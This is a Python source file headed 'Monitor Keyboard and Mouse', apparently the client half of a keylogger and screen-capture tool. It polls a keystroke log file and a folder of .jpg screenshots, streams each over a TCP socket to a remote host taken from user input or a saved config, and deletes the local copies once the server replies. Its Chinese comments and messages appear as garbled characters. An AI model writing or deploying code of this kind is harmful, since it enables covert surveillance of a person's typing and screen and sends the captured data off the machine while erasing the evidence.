# -*- coding: gbk -*-

"""
author: ����õ�������
done date: 2020.11.25
programing language: python
programing version: python3.78
contact: QQ<--2472674814-->  Email<--EternalNight996@gmail.com-->
describe: Monitor Keyboard and Mouse
current application version: 1.0
"""

import os, time
import gevent
import threading
import multiprocessing
from gevent import socket
from gevent import monkey;monkey.patch_all()


def monitor(pathlist, ADDRlist):
    while True:
        isdir=os.path.exists(pathlist['dos_pic_dir'])
        isfile=os.path.isfile(pathlist['dos_filename'])
        getsize=os.path.getsize(pathlist['dos_filename'])
        getlist=os.listdir(pathlist['dos_pic_dir'])
        if isfile and getsize:
            print(getsize)
            t_handle=threading.Thread(target=handle, name='handle_txt son line', args=(pathlist, ADDRlist,))
            t_handle.start()
            t_handle.join()
        if isdir and len(getlist)>0:
            if os.path.splitext(getlist[0])[1]=='.jpg':
                pathlist['pic_save_to']=os.path.join(pathlist['open_pic_dir'],getlist[0])
                pathlist['pic_name']=getlist[0]
                print(pathlist['pic_save_to'])
                print(pathlist['pic_name'])
                t_handle=threading.Thread(target=handle, name='handle_pic son line', args=(pathlist, ADDRlist,))
                t_handle.start()
                t_handle.join()
                pathlist['pic_save_to'],pathlist['pic_name']='',''
        time.sleep(1)

def clean_txt(dos_filename):
    os.system('type nul >%s' %dos_filename)
    if not os.path.getsize(dos_filename):
        return True
    else:
        return False

def clean_pic(pic_save_to):
    if os.path.isfile(pic_save_to):
        os.remove(pic_save_to)
    if not os.path.isfile(pic_save_to):
            return True
    return False

def open_deal(open_filename):
    msg=b''
    try:
        f=open(open_filename,'rb')
        msg=f.read()
    except:
        print('error{}'.format(open_filename))
    else:
        f.close()
        return msg

def sendfile(data, dos_filename, pic_save_to, set_code, BUFSIZE, clientSocket):
    i=0
    total=len(data)
    while i<total:
        data_send=data[i:i+BUFSIZE]
        clientSocket.send(data_send)
        i+=len(data_send)
    reply=clientSocket.recv(BUFSIZE)
    if 'txt done'==reply.decode(set_code):
        print('����',reply.decode(set_code))
        if clean_txt(dos_filename):
            print('�ɹ�����{}�ļ�'.format(dos_filename))
        else:
            print('�޷����{}�ļ�'.format(dos_filename))
    elif 'pic done'==reply.decode(set_code):
        print('����', reply.decode(set_code))
        print(pic_save_to)
        time.sleep(1)
        if clean_pic(pic_save_to):
            print('�ɹ�����{}ȫ��ͼƬ'.format(pic_save_to))
        else:
            print('�޷�����{}'.format(pic_save_to))

def confirm(filetype, open_filename, filename, set_code, BUFSIZE, clientSocket):
    print(clientSocket, filetype, open_filename, filename, set_code, BUFSIZE)
    data=open_deal(open_filename)
    print(len(data))
    clientSocket.send('{}|{}|{}'.format(len(data), filetype, filename).encode(set_code))
    msg=clientSocket.recv(BUFSIZE)
    if msg.decode(set_code)=='OK':
        print(msg.decode(set_code))
        return data
    else:
        print('confirm����')
        return None

def handle(pathlist, ADDRlist):
    print('�������ӷ�����......')
    while True:
        try:
            ADDRlist['clientSocket']=socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            ADDRlist['clientSocket'].setsockopt(socket.SOL_SOCKET, socket.SO_SNDBUF, 65535)
            ADDRlist['clientSocket'].connect(ADDRlist['rADDR'])
            print('�ɹ����������!!!')
            break
        except:
            print('�޷��������ӷ�����!!!')
        time.sleep(1)
    if os.path.getsize(pathlist['dos_filename']):
        data=confirm('txt', pathlist['open_filename'],
                None, ADDRlist['set_code'], ADDRlist['txtSIZE'], ADDRlist['clientSocket'])
        if data:
            sendfile(data, pathlist['dos_filename'], None,
                    ADDRlist['set_code'], ADDRlist['txtSIZE'], ADDRlist['clientSocket'])
        else:
            print('���ݴ���')
    elif pathlist['pic_save_to'] and pathlist['pic_name']:
        data=confirm('pic', pathlist['pic_save_to'], pathlist['pic_name'],
                ADDRlist['set_code'], ADDRlist['txtSIZE'],ADDRlist['clientSocket'])
        if data:
            sendfile(data, pathlist['dos_pic_dir'], pathlist['pic_save_to'], ADDRlist['set_code'],
                    ADDRlist['txtSIZE'], ADDRlist['clientSocket'])
    else:
        print('�ļ�����ʶ��ʧ��')
    ADDRlist['clientSocket'].close()

def init_setting():
    pathlist={'open_filename':'', 'pic_name':'', 'open_pic_dir':'', 'dos_filename':'',
            'dos_pic_dir':'', 'dos_config':'', 'open_config': '', 'pic_save_to':''}
    ADDRlist={'rADDR':(), 'rHOST':'', 'rPORT':0, 'picSIZE':0, 'txtSIZE':0, 'set_code': '', 'clientSocket':''}

    print('���ڼ�������ļ�{}'.format('.'*4))
    ADDRlist['picSIZE'],ADDRlist['txtSIZE']=4096,1024
    ADDRlist['set_code']='gbk' #���ı�׼��
    lhome=os.path.abspath('.')
    lhomelist=lhome.split('\\')
    pathlist['dos_filename']=lhome+'\\QQdata\\data\\Monitor_log.txt'
    pathlist['dos_pic_dir']=lhome+'\\QQdata\\data\\xx11\\'
    pathlist['dos_config']=lhome+'\\'+'Monitor_config.txt'
    for n in range(len(lhomelist)):
        pathlist['open_filename']+=lhomelist[n]+'/'
        pathlist['open_pic_dir']+=lhomelist[n]+'/'
        pathlist['open_config']+=lhomelist[n]+'/'
    pathlist['open_filename']+='QQdata/data/Monitor_log.txt'
    pathlist['open_pic_dir']+='QQdata/data/xx11/'
    pathlist['open_config']+='Monitor_config.txt'
    if not os.path.exists(pathlist['dos_config']):
        print('δ�����ͻ��������ļ�,��������������Ϣ..........')
        while True:
            if ADDRlist['rHOST'] and ADDRlist['rPORT']:
                break
            if not ADDRlist['rHOST']:
                try:
                    ADDRlist['rHOST']=input('��������ȷ�ķ�����IP��ַ(��www.xxx.com,xxx.xxx.xxx.xxx):')
                except:
                    print('����IP��ʽ')
            if not ADDRlist['rPORT']:
                try:
                    ADDRlist['rPORT']=input('��������ȷ�ķ������˿��Ƽ�(6666):')
                except:
                    print('����˿�')
        ADDRlist['rADDR']=(str(ADDRlist['rHOST']),int(ADDRlist['rPORT']))
        f=open(pathlist['open_config'],'w')
        f.write(ADDRlist['rHOST']+'\x0A'+ADDRlist['rPORT'])
        f.close()
        print('�ѳɹ������¿ͻ��������ļ�......')
    else:
        f=open(pathlist['open_config'], 'r')
        ff=f.read().split()
        ADDRlist['rHOST'],ADDRlist['rPORT']=ff[0],ff[1]
        ADDRlist['rADDR']=(str(ADDRlist['rHOST']),int(ADDRlist['rPORT']))
        f.close()
        print('�Ѵ��ڿͻ��������ļ����ѳɹ�����������Ϣ......')
    print('�������������ļ�')
    times=0
    while True:
        times+=1
        if (os.path.isfile(pathlist['dos_filename'])
                and os.path.exists(pathlist['dos_pic_dir'])):
            print('�ɹ��ҵ�����ļ���Ŀ¼')
            return pathlist, ADDRlist
        elif times==5:
            pathlist['open_filename']='D:/QQdata/data/Monitor_log.txt'
            pathlist['open_pic_dir']='D:/QQdata/data/xx11/'
            pathlist['dos_filename']='D:\\QQdata\\data\\Monitor_log.txt'
            pathlist['dos_pic_dir']='D:\\QQdata\\data\\xx11\\'
            print('�Ѿ�����Ĭ������......')
        else:
            print('�޷��ҵ������ļ���Ŀ¼')
        time.sleep(1)

def main():
    t_lines=[]
    pathlist, ADDRlist={},{}
    runlist={'connect':0}
    pathlist, ADDRlist=init_setting()
    t_lines.append(threading.Thread(target=monitor, name='monitor father line', args=(pathlist, ADDRlist)))
   
    print(t_lines)
    for t in t_lines:
        t.start()
    for t in t_lines:
        t.join()

if __name__ == "__main__":
    main()
